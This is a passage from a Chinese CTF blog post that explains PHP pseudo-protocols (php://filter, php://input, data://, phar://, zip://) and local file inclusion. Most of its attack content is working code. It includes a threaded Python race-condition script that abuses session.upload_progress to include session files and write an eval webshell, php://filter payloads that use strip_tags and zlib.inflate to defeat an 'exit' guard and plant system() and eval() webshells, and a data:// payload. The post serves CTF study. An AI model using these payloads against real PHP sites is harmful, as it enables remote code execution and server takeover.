文件包含</h4><p>原理：利用session.upload_progress上传一个临时文件，该文件里面有我们上传的恶意代码，然后包含它，从而执行里面的代码。因为该文件内容清空很快，所以需要不停的上传和包含，在清空之前包含该文件。</p><p>session中一部分数据(session.upload_progress.name)是用户自己可以控制的。那么我们只要上传文件的时候，在Cookie中设置PHPSESSID&#x3D;yym68686（默认情况下session.use_strict_mode&#x3D;0用户可以自定义Session ID），同时POST一个恶意的字段PHP_SESSION_UPLOAD_PROGRESS ，（PHP_SESSION_UPLOAD_PROGRESS在session.upload_progress.name中定义），只要上传包里带上这个键，PHP就会自动启用Session，同时，我们在Cookie中设置了PHPSESSID&#x3D;yym68686，所以Session文件将会自动创建。</p><p>因为session.upload_progress.cleanup &#x3D; on这个默认选项会有限制，当文件上传结束后，php将会立即清空对应session文件中的内容，这就导致我们在包含该session的时候相当于在包含一个空文件，没有包含我们传入的恶意代码。不过，我们只需要条件竞争，赶在文件被清除前利用即可。</p><p>编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://003ae9af-2700-4283-99e8-da47b33de836.node4.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;feng&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session) </span><br></pre></td></tr></table></figure><p>当运行停止后，发送请求：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flflflflag.php?file=shell.php HTTP/1.1</span><br><span class="line">Host: b75582fa-5dab-4f76-8734-1c591cb88d31.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 14</span><br><span class="line"></span><br><span class="line">cmd=phpinfo(); </span><br></pre></td></tr></table></figure><p>在响应里得到flag，藏在phpinfo()里。</p><p>或者运行完下面这个脚本后就可以直接获得flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://003ae9af-2700-4283-99e8-da47b33de836.node4.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;yym68686&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\rWaiting...&#x27;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\r&quot;</span> + re.search(<span class="string">r&#x27;flag&#123;(.*?)&#125;&#x27;</span>, response.text).group(<span class="number">0</span>))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session) </span><br></pre></td></tr></table></figure><p>这个脚本的前提是必须知道flag在phpinfo里面，所以局限性比较大。把<?php phpinfo();?>换成<?php system('cat \*');?>也可以，输出的依然是phpinfo()的内容。</p><hr><h3 id="护网杯easyphp"><a href="#护网杯easyphp" class="headerlink" title="护网杯easyphp"></a><a href="#%E6%8A%A4%E7%BD%91%E6%9D%AFeasyphp" title="护网杯easyphp"></a>护网杯easyphp</h3><p>护网杯遇到了一题easyphp，遇到了关于filter协议读写文件的内容。当时没有做出来，复现也没有给Docker，自己打一个环境。题目具体如何得到源码的过程就不说了，这里是关键文件的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is your sandbox: &quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . <span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的关键是利用php:&#x2F;&#x2F;filter伪协议进行文件包含，但是其中有死亡exit，以及众多filter协议的字符串过滤器WAF。</p><p>这里没有过滤<code>zlib.inflate</code>，植入php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|?&gt;&lt;?php eval($_GET[a]);?&gt;&lt;?/resource=shell.php</span></span><br></pre></td></tr></table></figure><p>在shell写入一句话木马，再包含文件就shell了。</p><p>看到这句话还是可以理解的，就是有些地方就想不通。为什么还要<code>?&gt;</code>和<code>&lt;?</code>？为什么这样可以绕过死亡exit？压缩后为什么还能执行？</p><p>于是就萌生了好好学学php伪协议filter的想法，以下就是自己的学习记录了。</p><h4 id="看几个样例吧"><a href="#看几个样例吧" class="headerlink" title="看几个样例吧"></a>看几个样例吧</h4><p>这里借鉴安全客的一篇文章的样例，链接在参考链接放出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接下来进行几个操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/resource=file.txt</span></span><br></pre></td></tr></table></figure><p>注意，当没有规定是否是write或者read时，php会视情况进行读或写文件。该数据流标识1明文读取file.txt文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=file.txt</span></span><br></pre></td></tr></table></figure><p>编码后读取file.txt文件。乍一看是相同的，编码后的文件读取甚至可能看起来更加麻烦一些。但是在读取例如PHP文件时，没有经过编码的文件将会被当做PHP文件执行，从而达不到读取文件的作用。</p><h4 id="什么是死亡exit"><a href="#什么是死亡exit" class="headerlink" title="什么是死亡exit"></a>什么是死亡exit</h4><p>死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . <span class="variable">$content</span>); </span><br></pre></td></tr></table></figure><p>亦或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;?php exit();?&gt;&#x27;</span> . <span class="variable">$content</span>); </span><br></pre></td></tr></table></figure><p>这样，当你插入一句话木马时，文件的内容是这样子的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;oatmeal&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看吧！这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。</p><h4 id="如何进行绕过-base64decode绕过"><a href="#如何进行绕过-base64decode绕过" class="headerlink" title="如何进行绕过-base64decode绕过"></a>如何进行绕过-base64decode绕过</h4><p>这里就可以用到filter协议来绕过了！看下这样的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。</p><p>然而这里可以利用php:&#x2F;&#x2F;filter的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除死亡exit。</p><p>base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>所以，当<code>$content</code> 包含 <code>&lt;?php exit; ?&gt;</code>时，解码过程会先去除识别不了的字符，<?;?>都将被去除，于是剩下的字符就只有<code>phpexit</code>以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</p><p>这个时候后面再加上编码后的一句话木马，就可以getshell了。<br><img src="https://www.leavesongs.com/content/uploadfile/201607/fca81469385894.png"></p><h3 id="如何进行绕过-strip-tags绕过"><a href="#如何进行绕过-strip-tags绕过" class="headerlink" title="如何进行绕过-strip_tags绕过"></a>如何进行绕过-strip_tags绕过</h3><p>就是前面写到的可以去除XML标签的过滤器啦。</p><p>这段代码：<code>&lt;?php exit; ?&gt;</code> 实际上就是XML标签，可以利用strip_tags进行去除，从而进行绕过。</p><p>但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。</p><p>注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。</p><p><img src="https://www.leavesongs.com/content/uploadfile/201607/95b61469385895.png"></p><h4 id="回到这题easyphp康康吧"><a href="#回到这题easyphp康康吧" class="headerlink" title="回到这题easyphp康康吧"></a>回到这题easyphp康康吧</h4><p>回到这道题，存在以下过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>可以注意到，过滤了极大部分的字符串过滤器和转换过滤器。幸运的是没有过滤压缩过滤器以及strip_tags，可以组合进行绕过。</p><p>首先我们需要写入一句话木马，将木马写入shell.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=&lt;?php eval($_GET[a]);?&gt;/resource=shell.php</span></span><br></pre></td></tr></table></figure><p>但是存在死亡exit，通过strip_tags绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|&lt;?php eval($_GET[a]);?&gt;/resource=shell.php</span></span><br></pre></td></tr></table></figure><p>这里传入一句话木马的过滤器使用了没有被过滤的 <code>zlib.inflate</code>，这样就可以写入一句话木马了。</p><h4 id="一点困惑"><a href="#一点困惑" class="headerlink" title="一点困惑"></a>一点困惑</h4><p>然鹅实际wp是这样子的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|?&gt;&lt;?php eval($_GET[a]);?&gt;&lt;?/resource=shell.php</span></span><br></pre></td></tr></table></figure><p>在代码的开头和结尾都多了?&gt;&lt;?的。我起先想的是闭合前面的标签，等主办方放个docker环境复现的时候测试一下自己的问题啦~有师傅知道的也可以评论一下，感激不尽！</p><hr><h4 id="另一种做法"><a href="#另一种做法" class="headerlink" title="另一种做法"></a>另一种做法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i&#x27;</span>),<span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$content</span>))</span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>简单代码审计一波，可以直接通过file_put_contents函数生成文件，但是有个&lt;?php exit();所以创建木马也没用，所以需要绕过他,可以通过filter过滤器来进行过滤，通过代码查看发现strip_tags没有过滤，也没有过滤zlib.inflate<br>因此构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;?&gt;&quot;</span>.<span class="title function_ invoke__">gzdeflate</span>(<span class="string">&#x27;&lt;?php system($_GET[_]);?&gt;&#x27;</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>生成<code>%3F%3E%B3%B1%2F%C8%28P%28%AE%2C.I%CD%D5P%89ww%0D%89%8E%8F%D5%B4%B6%B7%03%00</code><br>会发现其中有没有url编码的字符比如<code>.I</code>没有关系，但是<code>%00</code>要去掉不然会截断，从而写不了文件<br>同时使用<code>string.srip_tags</code>来去除php和html的标签，因为过滤器是从左到右执行的，因此在我们的payload使用zlib解压前不会被去除标签，因此可以构造以下payload<br><code>php://filter/write=string.strip\_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource.php=idlab.php</code></p><p>传入<code>_</code>参数即可执行命令<br><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/7.png"></p><h4 id="base64-decode写入"><a href="#base64-decode写入" class="headerlink" title="base64-decode写入"></a>base64-decode写入</h4><p>使用convert.base64-encode筛选器写入也可以,但是要注意编码的时候是8个字符一组</p><p><code>php://filter/write=convert.base64-decode/resource=shsell.php</code></p><h2 id="php-x2F-x2F-input-x2F"><a href="#php-x2F-x2F-input-x2F" class="headerlink" title="php:&#x2F;&#x2F;input&#x2F;"></a><a href="#php-input" title="php://input/"></a>php:&#x2F;&#x2F;input&#x2F;</h2><p>使用POST上传PHP代码并执行<br>下面由于服务器过滤了导致无法执行</p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/6.png"></p><h2 id="php其他用法"><a href="#php其他用法" class="headerlink" title="php其他用法"></a><a href="#php%E5%85%B6%E4%BB%96%E7%94%A8%E6%B3%95" title="php其他用法"></a>php其他用法</h2><table><thead><tr><th align="center">协议</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">php:&#x2F;&#x2F;input</td><td align="center">可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype&#x3D;”multipart&#x2F;form-data” 的时候php:&#x2F;&#x2F;input 是无效的。</td></tr><tr><td align="center">php:&#x2F;&#x2F;output</td><td align="center">只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td align="center">php:&#x2F;&#x2F;fd</td><td align="center">(&gt;&#x3D;5.3.6)允许直接访问指定的文件描述符。例如 php:&#x2F;&#x2F;fd&#x2F;3 引用了文件描述符 3。</td></tr><tr><td align="center">php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td><td align="center">(&gt;&#x3D;5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php:&#x2F;&#x2F;memory 总是把数据储存在内存中，而 php:&#x2F;&#x2F;temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</td></tr></tbody></table><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a><a href="#file" title="file://"></a>file:&#x2F;&#x2F;</h2><p>file:&#x2F;&#x2F;和php:&#x2F;&#x2F;filter差不多，但是只能写绝对路径</p><p><code>https://www.baidu.com?file=file://C:/ProgramFile/1.txt</code></p><h2 id="phar-x2F-x2F-和zip-x2F-x2F"><a href="#phar-x2F-x2F-和zip-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;"></a><a href="#phar-%E5%92%8Czip" title="phar://和zip://"></a>phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;</h2><p><em>phar:&#x2F;&#x2F;和zip:&#x2F;&#x2F;都可以查找指定压缩包内的文件</em></p><p>phar:&#x2F;&#x2F;可以写绝对路径和相对路径</p><p><code>https://www.baidu.com?file=phar://C:/ProgramFile/test.zip/1.txt https://www.baidu.com?file=phar://./test.zip/1.txt</code><br>而zip:&#x2F;&#x2F;只能写绝对路径</p><p><code>https://www.baidu.com?file=zip://./text.zip%231.txt</code><br><em>注意这里的#用于分开压缩包和压缩包文件并且被编码成%23</em></p><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a><a href="#data" title="data://"></a>data:&#x2F;&#x2F;</h2><p>data和input类似，都可以传入PHP代码执行</p><ol><li>data:&#x2F;&#x2F;text&#x2F;plain</li></ol><p><code>https://www.baidu.com?file=data://text/plain,&lt;?php echo &quot;flag&quot;; ?&gt;</code><br>2.  data:&#x2F;&#x2F;text&#x2F;plain;base64,</p><p><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code>    </p><h2 id="http-x2F-x2F"><a href="#http-x2F-x2F" class="headerlink" title="http:&#x2F;&#x2F;"></a><a href="#http" title="http://"></a>http:&#x2F;&#x2F;</h2><p>http可以传入外部链接</p><p><code>https://www.baidu.com?file=http://www.google.com</code></p><h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a><a href="#zip" title="zip://"></a>zip:&#x2F;&#x2F;</h2><p>使用<code>zip://</code>后悔自动将这个Zip文件按照压缩时的文件结构进行解析，<br>通过<code>zip://filename%23shell.php</code>的形式对Zip内部压缩的文件进行索引</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><a href="#%E6%80%BB%E7%BB%93" title="总结"></a>总结</h1><p>file:&#x2F;&#x2F; php:&#x2F;filter 可以访问本地文件（file:&#x2F;&#x2F;要用绝对路径）<br>zip:&#x2F;&#x2F; phar:&#x2F;&#x2F; 可以访问压缩文件（phar:&#x2F;&#x2F;可以用绝对和相对路径，zip:&#x2F;&#x2F;只能用绝对路径）<br>php:&#x2F;&#x2F;input data:&#x2F;&#x2F; 可以传入控制代码（php:&#x2F;&#x2F;input 用POST方法上传，data:&#x2F;&#x2F;直接用url输入就可以）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP伪协议小总结&quot;&gt;&lt;a href=&quot;#PHP伪协议小总结&quot; class=&quot;headerlink&quot; title=&quot;PHP伪协议小总结&quot;&gt;&lt;/a&gt;PHP伪协议小总结&lt;/h1&gt;&lt;h1 id=&quot;初步探索&quot;&gt;&lt;a href=&quot;#初步探索&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="WEB" scheme="https://lhhxs.github.io/categories/WEB/"/>
    
    
    <category term="web" scheme="https://lhhxs.github.io/tags/web/"/>
    
    <category term="lfi" scheme="https://lhhxs.github.io/tags/lfi/"/>
    
  </entry>
  
  <entry>
    <title>CTF中的信息泄露</title>
    <link href="https://lhhxs.github.io/2022/09/09/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/CTF%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>https://lhhxs.github.io/2022/09/09/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/CTF%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
    <published>2022-09-09T07:48:21.291Z</published>
    <updated>2022-09-09T14:23:06.622Z</updated>
    
